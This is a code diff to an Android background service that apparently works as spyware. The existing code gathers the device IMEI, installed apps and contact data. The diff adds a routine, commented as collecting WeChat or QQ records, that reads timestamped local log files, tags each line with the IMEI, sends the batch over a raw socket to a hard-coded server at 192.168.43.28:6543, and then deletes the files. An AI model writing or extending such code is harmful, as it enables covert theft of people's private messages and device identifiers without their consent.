@@ -11,6 +11,7 @@ import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Binder;
+import android.os.Environment;
 import android.os.IBinder;
 import android.provider.ContactsContract;
 import android.support.v4.app.ActivityCompat;
@@ -18,11 +19,17 @@ import android.support.v4.content.ContextCompat;
 import android.telephony.TelephonyManager;
 import android.text.LoginFilter;
 import android.util.ArrayMap;
+import android.util.JsonReader;
 import android.util.Log;
 
+import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
@@ -30,6 +37,7 @@ import java.net.Socket;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.Calendar;
 import java.util.Date;
 import java.util.HashMap;
 import java.util.HashSet;
@@ -201,8 +209,8 @@ public class MyService extends Service {
                     for(PackageInfo packageInfo : packages){
                         String packageName = packageInfo.applicationInfo.loadLabel(packageManager).toString();
                         if(appList.contains(packageName)){
-                            apps.put(i_app + "",packageName);
-                            i_app ++;
+                                apps.put(i_app + "",packageName);
+                                i_app ++;
                         }
                     }
                 }catch (Exception e){
@@ -212,14 +220,95 @@ public class MyService extends Service {
 
                 //查询GPS坐标
 
+                //查询微信或者QQ的记录
+                SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy_MM_dd_HH_mm");
+                Date datetime = new Date();
+                Calendar calendar = Calendar.getInstance();
+                calendar.setTime(datetime);
+                calendar.add(Calendar.MINUTE,-1);
+                Date datetime1 = calendar.getTime();
+                String date1 = dateFormat.format(datetime1);
+                calendar.add(Calendar.MINUTE,-1);
+                Date datetime2 = calendar.getTime();
+                String date2 = dateFormat.format(datetime2);
+
+
+                FileInputStream in = null;
+                BufferedReader reader = null;
+
+                JSONObject jilu,jilus;
+                jilus = new JSONObject();
+                int i = 0;
+                String line = "";
+                /***
+                try {
+                    in = openFileInput(date2);
+                    Log.d("服务 读取 文件名",date2);
+                    reader = new BufferedReader(new InputStreamReader(in));
+
+                    while ((line = reader.readLine()) != null){
+                        Log.d("服务 读取 内容1条",line);
+                        jilu = new JSONObject();
+                        jilu.put("IMEI",IMEI);
+                        jilu.put("记录",line);
+                        jilus.put(i + "",jilu);
+                        i++;
+                    }
+                    in.close();
+                }catch (IOException e){
+                    e.printStackTrace();
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+                ***/
+
+                try {
+                    in = openFileInput(date1);
+                    Log.d("服务 读取 文件名",date1);
+                    reader = new BufferedReader(new InputStreamReader(in));
+                    while ((line = reader.readLine()) != null){
+                        Log.d("服务 读取 内容1条",line);
+                        jilu = new JSONObject();
+                        jilu.put("IMEI",IMEI);
+                        jilu.put("记录",line);
+                        jilus.put(i + "",jilu);
+                        i++;
+                    }
+                    in.close();
+                }catch (IOException e){
+                    e.printStackTrace();
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+
 
                 //Socket编程，向服务器传输信息
+
+                //Log.d("服务 文件名data2",date2);
+                Log.d("服务 文件名data1",date1);
+
+                try{
+                    Log.d("服务 文件读取",jilus.toString());
+                    if(jilus.length() > 0)
+                        socketSend("QW",jilus);
+
+                    // 这个删除文件以后需要放在发送完信息以后
+                    if(deleteFile(date2))
+                        Log.d("服务 文件删除成功",date2);
+                    if(deleteFile(date1))
+                        Log.d("服务 文件删除成功",date1);
+
+                }catch (Exception e){
+                    e.printStackTrace();
+                }
+
+
                 Log.d("Socket 编程","准备开启");
                 try {
                     String rec_data = socketSend("IMEI",IMEI);
                     String type;
 
-                    while (rec_data != "GPS ok") {
+                    while (rec_data != "all ok") {
                         switch (rec_data) {
                             case "IMEI ok":
                                 type = "keyword_contact";
@@ -266,6 +355,7 @@ public class MyService extends Service {
 
     }
 
+
     private String socketSend(String type,Object data){
         try {
             Socket mysocket = new Socket("192.168.43.28",6543);
@@ -274,15 +364,12 @@ public class MyService extends Service {
 
             String send_data,rec_data;
 
-
-
-
             out.write(type.getBytes());
             out.flush();
             Log.d("发送类型",type+" 发送成功");
 
 
-            if(type != "keyword_message"){
+            if(type != "keyword_message" && type != "QW"){
                 send_data = data.toString();
                 out.write(send_data.getBytes());
                 out.flush();
